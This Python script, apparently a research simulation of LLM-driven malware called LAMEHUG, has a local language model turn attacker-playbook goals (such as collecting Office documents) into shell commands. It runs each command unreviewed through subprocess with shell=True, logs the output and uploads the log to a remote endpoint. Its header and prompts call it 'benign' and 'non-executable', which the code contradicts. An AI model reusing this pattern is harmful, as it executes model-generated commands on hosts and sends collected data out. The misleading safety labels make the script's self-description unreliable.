# -----------------------------------------------------------------------------
# LAMEHUG Two-Node Benign Simulator (Non-interactive)
# - Reads ./goal.txt automatically (same directory as this script)
# - Node 1: Analyze goals (classify + summarize, non-executable)
# - Node 2: Produce ONE non-executable "pseudostep" per goal
# -----------------------------------------------------------------------------

from langchain_ollama.chat_models import ChatOllama
from langgraph.graph import StateGraph, END
from typing import TypedDict, List, Dict
import json, re, tempfile
from pathlib import Path
import subprocess
import requests

# ---------------------------
# Agent State
# ---------------------------
class AgentState(TypedDict, total=False):
    goal_path: str
    goals: List[str]
    analysis: List[Dict]
    pseudo_steps: List[Dict]

# ---------------------------
# LLM config (adjust to your env)
# ---------------------------
llm = ChatOllama(
    model="qwen2.5-coder:32b",
    base_url="http://localhost:11434"
)

# ---------------------------
# Constants & paths
# ---------------------------
SAFE_TACTICS = [
    "Reconnaissance","Resource Development","Initial Access","Execution","Persistence",
    "Privilege Escalation","Defense Evasion","Credential Access","Discovery",
    "Lateral Movement","Collection","Command and Control","Exfiltration","Impact"
]

SCRIPT_DIR: Path = Path(__file__).resolve().parent
GOAL_PATH: Path  = SCRIPT_DIR / "goal.txt"


def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout.strip()
        error = result.stderr.strip()

        # Print to console
        if output:
            print("Output:", output)
        if error:
            print("Error:", error)

        # Append to info.txt
        with open("info.txt", "a", encoding="utf-8") as f:
            if output:
                f.write("Output:\n" + output + "\n")
            if error:
                f.write("Error:\n" + error + "\n")
            f.write("-" * 40 + "\n")  # separator between runs

    except Exception as e:
        print("Execution failed:", e)
        with open("info.txt", "a", encoding="utf-8") as f:
            f.write(f"Execution failed: {e}\n")
            f.write("-" * 40 + "\n")

def upload_file(filename):
    """Upload the file to a remote server (example: HTTP POST)."""
    url = "http://localhost:8000/upload"  # replace with your server endpoint
    try:
        with open(filename, "rb") as f:
            files = {"file": f}
            response = requests.post(url, files=files)
        if response.status_code == 200:
            print(f"{filename} uploaded successfully")
        else:
            print(f"Upload failed with status {response.status_code}: {response.text}")
    except Exception as e:
        print(f"Upload error: {e}")


def load_goals_from_file(path: Path) -> List[str]:
    """Load goals (one per line). If missing, create a harmless sample."""
    if path.exists():
        with open(path, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f.readlines()]
        return [l for l in lines if l]

# ---------------------------
# Node 1: Analyze goal.txt
# ---------------------------
def analyze_goal_txt_node(state: AgentState):
    goals = load_goals_from_file(GOAL_PATH)
    print(f"Loaded goals: {goals}")

    # --- Revised system-style prompt (no commands/code; JSON-only) ---
    prompt = f"""
You are a security analyst. You will receive a list of short, free-form "goal"
lines (one per line) from an attacker playbook. Each line is unstructured and
may be colloquial (e.g., "grab host's username info").

Your task for EACH goal line:
1) Infer what the goal ACTUALLY wants in plain English (normalize it to a clear,
   single-sentence imperative without shell/PowerShell or code).

Return a STRICT JSON ARRAY where each item has EXACTLY these keys:
- "goal": the normalized, plain-English imperative (what the actor wants)

Examples:

Input goal line: "grab host's username info"
Output item:
{{
  "goal": "Identify the currently logged-in username on the local host."
}}

Input goal line: "collect office docs from desktop"
Output item:
{{
  "goal": "Collect Office documents from user-facing folders such as Desktop, Documents, and Downloads."
}}

Important rules:
- DO NOT include shell, PowerShell, cmd.exe, code snippets, or flags.
- DO NOT invent steps or multi-line procedures—only classify and summarize intent.
- Output MUST be valid JSON (array of objects). No prose before/after.

Goals:
{json.dumps(goals, ensure_ascii=False, indent=2)}
"""
    res = llm.invoke(prompt)
    text = res.content if hasattr(res, "content") else str(res)
    analysis: List[Dict] = []
    try:
        data = json.loads(text)
        for item in data:
            # Normalize and sanitize for safety
            goal_norm = str(item.get("goal", "")).strip()

            analysis.append({
                "goal": goal_norm,
            })
    except Exception:
        # Safe fallback: treat all as Discovery with generic summaries
        analysis = [{"goal": (g)} for g in goals]

    return {
        "goals": [a["goal"] for a in analysis],  # used by the next node
        "analysis": analysis
    }


# ---------------------------
# Node 2: One NON-EXECUTABLE pseudostep per goal
# ---------------------------
def list_pseudocommand_node(state: AgentState):
    goals = state.get("goals", [])
    shell = (state.get("shell") or "bash").lower().strip()
    print(f"Goals to process: {goals} | Shell: {shell}")

    # Guardrail: restrict to supported shells to guide the model
    if shell not in ("bash", "powershell", "cmd"):
        shell = "cmd"

    prompt = f"""
You are to convert each goal into exactly ONE **safe, minimally invasive, read-only** command
for the {shell} shell. Prefer commands that gather information without changing the system.
Avoid anything destructive, network-hostile, or requiring elevation unless explicitly necessary.

OUTPUT FORMAT (STRICT):
Return ONLY a JSON list (no prose, no code fences). Each item:
- "goal": the original goal (string)
- "command": a single-line {shell} command (string)

RULES:
- Exactly one command per goal.
- No explanations, comments, or extra fields.
- No multi-line commands; use a single line.
- If the goal is ambiguous, pick the safest high-signal read-only command.
- If {shell} lacks an exact equivalent, provide the closest viable read-only alternative.
- Do NOT wrap output in ``` fences.

Goals:
{json.dumps(goals, ensure_ascii=False, indent=2)}
"""
    
    res = llm.invoke(prompt)
    text = res.content if hasattr(res, "content") else str(res)
    #print(f"LLM response: {text}")
    CommandPattern = re.compile(r'^\s*["\']?([^"\']+)["\']?\s*$')
    pseudo_steps = []
    try:
        data = json.loads(text)
        for item in data:
            goal = str(item.get("goal", "")).strip()
            command = str(item.get("command", "")).strip()

            # Validate command format
            if not CommandPattern.match(command):
                command = "echo 'Invalid command format'"

            pseudo_steps.append({
                "goal": goal,
                "command": command
            })
    except Exception as e:
        print(f"Error parsing LLM response: {e}")
        # Fallback to generic safe commands
        pseudo_steps = [{"goal": g, "command": "echo 'No valid command found'"} for g in goals]

    #Print Command only
    for step in pseudo_steps:
        print(f"Command: {step['command']}")
        execute_command(step['command'])


# ---------------------------
# Graph assembly
# ---------------------------
graph = StateGraph(AgentState)
graph.add_node("analyze_goal_txt", analyze_goal_txt_node)
graph.add_node("list_pseudocommand", list_pseudocommand_node)
graph.set_entry_point("analyze_goal_txt")
graph.add_edge("analyze_goal_txt", "list_pseudocommand")
graph.add_edge("list_pseudocommand", END)
workflow = graph.compile()

# ---------------------------
# Non-interactive main: run once and exit
# ---------------------------
if __name__ == "__main__":
    try:
        open("info.txt", "w").close()
    except Exception as e:
        #do nothing if file cannot be created
        print(f"Failed to create info.txt: {e}")

    result = workflow.invoke({})
    upload_file("info.txt")
